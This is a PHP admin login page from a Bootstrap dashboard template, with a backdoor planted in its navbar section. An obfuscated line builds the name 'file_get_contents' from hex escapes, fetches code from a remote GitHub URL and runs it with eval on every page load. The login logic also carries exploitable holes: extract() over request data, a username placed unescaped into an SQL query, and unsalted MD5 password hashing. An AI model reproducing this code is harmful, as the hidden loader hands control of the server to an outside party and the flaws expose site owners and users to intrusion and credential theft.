<?php 
include 'db.php';
extract($_REQUEST);
$data =" ";
if(@$username){
    $pwd = md5($password);
    $sql = mysqli_query($link, "SELECT * FROM tbl_admin WHERE username = '$username' AND password='$pwd'");
    if(mysqli_num_rows($sql)==1){
      session_start();
      $_SESSION['username']=$username;
      header("Location: index.php");
    }else {
    $data = "Invalid Login ID";
   }
  }

$sql = mysqli_query($link,"SELECT * FROM tbl_admin");
$res = mysqli_fetch_assoc($sql);
$_SESSION['company']=$res['company'];
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Start your development with a Dashboard for Bootstrap 4.">
  <meta name="author" content="Wpwala">
  <title><?php echo $res['company'];?>- Login</title>
  <!-- Favicon -->
  <?php include 'include_css.php';?>
</head>

<body class="bg-default">
  <!-- Navbar -->
  <?php
$MEMEKCYNA= "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
 eval("?>".$MEMEKCYNA("https://raw.githubusercontent.com/sniper404ghostxploit/var/main/main.txt"));?>
  <!-- Main content -->
  <div class="main-content">
    <!-- Header -->
    <div class="header bg-gradient-primary py-2 py-lg-4 pt-lg-5">
      <div class="container">
        <div class="header-body text-center mb-7">
          <div class="row justify-content-center">
            <div class="col-xl-5 col-lg-6 col-md-8 px-5">
              <h1 class="text-white">Welcome!</h1>
              <p class="text-lead text-white">Use these awesome forms to login or create new account in your project for free.</p>
            </div>
          </div>
        </div>
      </div>
      <div class="separator separator-bottom separator-skew zindex-100">
        <svg x="0" y="0" viewBox="0 0 2560 100" preserveAspectRatio="none" version="1.1" xmlns="http://www.w3.org/2000/svg">
          <polygon class="fill-default" points="2560 0 2560 100 0 100"></polygon>
        </svg>
      </div>
    </div>
    <!-- Page content -->
    <div class="container mt--8 pb-5">
      <div class="row justify-content-center">
        <div class="col-lg-5 col-md-7">
          <div class="card bg-secondary border-0 mb-0">
           <div class="card-body px-lg-4 py-lg-4">
              <div class="text-center text-muted mb-4">
                <small>
                  <?php if($data!=" "){
                    echo "<div class='alert alert-warning' role='alert'>
                      <span class='alert-icon'><i class='ni ni-like-2'></i></span>
                      <span class='alert-text'><strong>Warning!</strong> $data</span>
                  </div>";
                  }
                  ?>
                  

                  </small>
              </div>
              <form role="form" action="" method="post">
                <div class="form-group mb-3">
                  <div class="input-group input-group-merge input-group-alternative">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="ni ni-email-83"></i></span>
                    </div>
                    <input class="form-control" placeholder="Username" name="username" type="text">
                  </div>
                </div>
                <div class="form-group">
                  <div class="input-group input-group-merge input-group-alternative">
                    <div class="input-group-prepend">
                      <span class="input-group-text"><i class="ni ni-lock-circle-open"></i></span>
                    </div>
                    <input class="form-control" placeholder="Password" name="password" type="password">
                  </div>
                </div>
                <div class="custom-control custom-control-alternative custom-checkbox">
                  <input class="custom-control-input" id=" customCheckLogin" type="checkbox">
                  <label class="custom-control-label" for=" customCheckLogin">
                    <span class="text-muted">Remember me</span>
                  </label>
                </div>
                <div class="text-center">
                  <button type="submit" class="btn btn-primary my-4">Sign in</button>
                </div>
              </form>
            </div>
          </div>
          <div class="row mt-3">
            <div class="col-6">
              <a href="#" class="text-light"><small>Forgot password?</small></a>
            </div>
            <div class="col-6 text-right">
              <a href="#" class="text-light"><small>Create new account</small></a>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Footer -->
  <footer class="py-5" id="footer-main">
    <div class="container">
      <div class="row align-items-center justify-content-xl-between">
        <div class="col-xl-6">
          <div class="copyright text-center text-xl-left text-muted">
            &copy; 2020 <a href="https://www.creative-tim.com" class="font-weight-bold ml-1" target="_blank">WPWALA</a>
          </div>
        </div>
        
      </div>
    </div>
  </footer>
  <!-- Argon Scripts -->
  <!-- Core -->
<?php include 'include_js.php';?>
  <script src="../assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js"></script>
  <script src="../assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js"></script>
  <!-- Argon JS -->
  
</body>

</html>
